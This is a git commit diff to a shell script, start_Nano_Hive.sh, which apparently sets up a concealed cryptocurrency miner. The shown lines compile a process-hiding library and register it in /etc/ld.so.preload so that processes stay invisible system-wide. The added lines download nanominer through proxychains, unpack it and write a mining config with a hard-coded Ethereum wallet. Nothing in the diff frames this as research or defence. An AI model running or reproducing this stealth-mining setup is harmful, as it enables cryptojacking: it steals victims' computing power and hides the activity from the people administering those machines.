f1b44550625c85a51d356a812d32c75c80c97070
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-03-28 19:25:42 +0200

    Update start_Nano_Hive.sh

--- start_Nano_Hive.sh
+++ start_Nano_Hive.sh
@@ -11,7 +11,10 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-
+proxychains wget https://github.com/nanopool/nanominer/releases/download/3.3.2/nanominer-linux-3.3.2-cuda11.tar.gz
+tar -xvzf nanominer-linux-3.3.2-cuda11.tar.gz
+cd nanominer-linux-3.3.2-cuda11
+rm config*
 cat > config_eth.ini <<END
 [Ethash]
 wallet = 0x8CB8003E428D0Fd7693D22f576A212403728c64a
